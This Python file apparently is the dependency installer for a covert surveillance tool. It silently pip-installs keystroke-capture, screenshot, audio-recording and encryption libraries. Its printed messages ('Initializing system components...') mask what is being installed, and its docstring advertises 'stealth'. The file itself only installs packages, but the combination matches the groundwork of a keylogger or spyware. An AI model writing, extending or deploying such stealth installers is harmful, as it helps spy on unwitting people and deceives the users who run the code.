"""
Auto-installer for dependencies with stealth and error handling.
"""
import os
import sys
import subprocess
import threading
import time
from typing import List, Dict

class SilentInstaller:
    def __init__(self):
        self.required_packages = [
            'pynput>=1.7.6',
            'pyscreenshot>=3.0', 
            'sounddevice>=0.4.5',
            'cryptography>=3.4.8',
            'Pillow>=8.3.2'
        ]
        self.install_log = []
    
    def _run_silent_install(self, package: str) -> bool:
        """Install package silently with error handling."""
        try:
            # Use subprocess with minimal output
            result = subprocess.run([
                sys.executable, '-m', 'pip', 'install', 
                '--quiet', '--disable-pip-version-check', package
            ], capture_output=True, timeout=300)
            
            success = result.returncode == 0
            if success:
                self.install_log.append(f"✓ {package}")
            else:
                self.install_log.append(f"✗ {package}: {result.stderr.decode()}")
            
            return success
        except Exception as e:
            self.install_log.append(f"✗ {package}: {str(e)}")
            return False
    
    def install_dependencies(self) -> bool:
        """Install all required dependencies."""
        print("Initializing system components...")
        
        success_count = 0
        for package in self.required_packages:
            if self._run_silent_install(package):
                success_count += 1
            time.sleep(1)  # Prevent overwhelming the system
        
        print(f"System initialization complete ({success_count}/{len(self.required_packages)} components)")
        return success_count == len(self.required_packages)
    
    def get_install_log(self) -> List[str]:
        """Get installation log for debugging."""
        return self.install_log 